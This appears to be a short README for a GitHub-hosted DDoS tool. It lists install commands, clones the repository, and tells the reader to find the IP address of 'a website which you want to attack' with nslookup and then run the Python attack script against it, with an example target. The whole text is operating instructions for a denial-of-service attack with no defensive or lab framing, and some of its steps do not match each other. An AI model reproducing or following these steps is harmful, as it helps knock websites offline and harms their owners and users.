$ apt update<br>
$ apt upgrade<br>
$ apt install python<br>
$ apt install git<br>
$ apt install dnsutils<br>
$ git clone https://github.com/omaralhaded00/DDoS.git

omar alhaded need the <b>Name Server</b> of a website which you want to attack...<br>
To get the Name Server...just type<br>
$ <b>nslookup example.com<b><br>
Note the IP Address of that Website<br>

then <br>
$ cd omar alhaded<br>
$ python3 omaralhaded.py -s [ip Address] -t 135<br>
example:<br>
$ python3 omaralhaded.py -s 123.45.67.89 -t 135<br>

Video Tutorial:
How to use omaralhaded [`Watch it`](soon)
